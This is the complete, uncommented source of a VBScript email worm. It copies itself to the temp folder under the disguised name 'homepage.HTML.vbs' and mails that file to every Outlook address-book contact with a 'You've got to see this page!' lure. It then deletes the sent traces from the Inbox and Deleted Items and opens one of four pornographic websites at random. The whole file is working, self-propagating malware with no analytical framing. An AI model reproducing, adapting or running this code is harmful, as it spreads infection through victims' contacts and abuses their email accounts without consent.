On Error Resume Next
Set WS = CreateObject("WScript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Folder=FSO.GetSpecialFolder(2)

Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream<>True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
Loop

Set OutF=FSO.OpenTextFile(Folder&"\homepage.HTML.vbs",2,true)
OutF.write ScriptBuffer
OutF.close
Set FSO=Nothing

If WS.regread ("HKCU\software\An\mailed") <> "1" then
Mailit()
End If

Set s=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
If u.Items.Item(i).subject="Homepage" Then
u.Items.Item(i).close
u.Items.Item(i).delete
End If
Next
Set u=t.GetDefaultFolder(3)
For i=1 to u.items.count
If u.Items.Item(i).subject="Homepage" Then
u.Items.Item(i).delete
End If
Next

Randomize
r=Int((4*Rnd)+1)
If r=1 then
WS.Run("http://hardcore.pornbillboard.net/shannon/1.htm")
elseif r=2 Then
WS.Run("http://members.nbci.com/_XMCM/prinzje/1.htm")
elseif r=3 Then
WS.Run("http://www2.sexcropolis.com/amateur/sheila/1.htm")
ElseIf r=4 Then
WS.Run("http://sheila.issexy.tv/1.htm")
End If

Function Mailit()
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
 Set Mapi=Outlook.GetNameSpace("MAPI")
 Set Lists=Mapi.AddressLists
 For Each ListIndex In Lists
  If ListIndex.AddressEntries.Count <> 0 Then
   ContactCount = ListIndex.AddressEntries.Count
   For Count= 1 To ContactCount
    Set Mail = Outlook.CreateItem(0)
    Set Contact = ListIndex.AddressEntries(Count)
    Mail.To = Contact.Address
    Mail.Subject = "Homepage"
    Mail.Body = vbcrlf&"Hi!"&vbcrlf&vbcrlf&"You've got to see this page!
It's really cool ;O)"&vbcrlf&vbcrlf
    Set Attachment=Mail.Attachments
    Attachment.Add Folder & "\homepage.HTML.vbs"
    Mail.DeleteAfterSubmit = True
    If Mail.To <> "" Then
    Mail.Send
    WS.regwrite "HKCU\software\An\mailed", "1"
   End If
   Next
  End If
 Next
End if
End Function